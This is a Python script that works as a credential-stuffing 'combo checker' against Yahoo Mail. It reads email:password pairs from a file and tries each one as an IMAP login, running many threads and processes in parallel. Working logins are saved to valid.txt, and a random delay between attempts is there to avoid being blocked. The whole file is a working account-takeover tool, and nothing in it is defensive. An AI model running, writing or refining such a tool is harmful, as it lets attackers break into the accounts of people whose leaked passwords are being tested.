import imaplib
import os
import random
import time
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pool, cpu_count
from threading import Lock

# Thread-safe write
lock = Lock()

# Yahoo IMAP server mappings
YAHOO_SERVERS = {
    "default": "imap.mail.yahoo.com",
    "yahoo.co.jp": "imap.mail.yahoo.co.jp",
    #"yahoo.ne.jp": "imap.mail.yahoo.ne.jp"
}
IMAP_PORT = 993

def save_result(filename, combo):
    with lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(combo + "\n")

def get_imap_server(email):
    """Return correct IMAP server for Yahoo email or None if not Yahoo."""
    domain = email.split("@")[-1].lower()
    if not domain.startswith("yahoo."):
        return None
    return YAHOO_SERVERS.get(domain, YAHOO_SERVERS["default"])

def check_login(combo):
    combo = combo.strip()
    if not combo or ":" not in combo:
        save_result("failed.txt", combo)
        print(f"⚠️ Skipped invalid format: {combo}")
        return

    email, password = combo.split(":", 1)
    server = get_imap_server(email)

    # Skip non-Yahoo silently
    if server is None:
        return

    try:
        imap = imaplib.IMAP4_SSL(server, IMAP_PORT)
        imap.login(email, password)
        print(f"✅ VALID: {email}:{password}")
        save_result("valid.txt", f"{email}:{password}")
        imap.logout()

    except imaplib.IMAP4.error:
        print(f"❌ INVALID: {email}:{password}")
        save_result("invalid.txt", f"{email}:{password}")

    except Exception as e:
        print(f"⚠️ FAILED: {email}:{password} ({e})")
        save_result("failed.txt", f"{email}:{password}")

    time.sleep(random.uniform(0.1, 0.3))  # Small delay to reduce blocks

def process_chunk(chunk, threads):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_login, chunk)

def main():
    file_path = input("Enter file path (.txt): ").strip()
    if not os.path.exists(file_path):
        print("❌ File not found!")
        return

    try:
        threads = int(input("Threads per process (e.g. 20): ").strip())
        if threads < 1:
            threads = 1
    except:
        threads = 20

    try:
        processes = int(input(f"Number of processes (max {cpu_count()}): ").strip())
        if processes < 1:
            processes = 1
        elif processes > cpu_count():
            processes = cpu_count()
    except:
        processes = cpu_count()

    with open(file_path, "r", encoding="utf-8") as f:
        combos = [line.strip() for line in f if line.strip()]

    chunk_size = len(combos) // processes if processes > 1 else len(combos)
    chunks = [combos[i:i + chunk_size] for i in range(0, len(combos), chunk_size)]

    print(f"\n🚀 Starting Yahoo IMAP checker with {processes} processes × {threads} threads each...\n")

    with Pool(processes=processes) as pool:
        pool.starmap(process_chunk, [(chunk, threads) for chunk in chunks])

    print("\n✅ Done! Results saved in valid.txt, invalid.txt, failed.txt")

if __name__ == "__main__":
    main()
